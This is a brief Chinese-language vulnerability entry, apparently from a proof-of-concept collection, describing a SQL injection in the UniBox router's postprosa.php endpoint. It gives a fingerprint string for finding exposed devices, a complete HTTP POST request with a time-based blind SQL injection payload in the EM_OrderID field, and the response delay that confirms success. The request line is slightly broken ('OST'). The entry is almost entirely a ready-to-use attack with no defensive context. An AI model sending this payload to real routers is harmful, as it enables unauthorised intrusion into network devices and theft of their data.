# unibox路由器postprosa存在SQL注入漏洞

unibox ｜ SQL注入 ｜ —
- **指纹**：`body="UniBox"`

**Payload**
```
OST /api/postprosa.php HTTP/1.1
Host:
Content-Length: 87
Content-Type: application/x-www-form-urlencoded
EM_OrderID=1'+AND+(SELECT+3676+FROM+(SELECT(SLEEP(5)))sdgB)+AND+'rBTA'%3d'rBTA
```
- **响应特征**：200 响应时间>=5s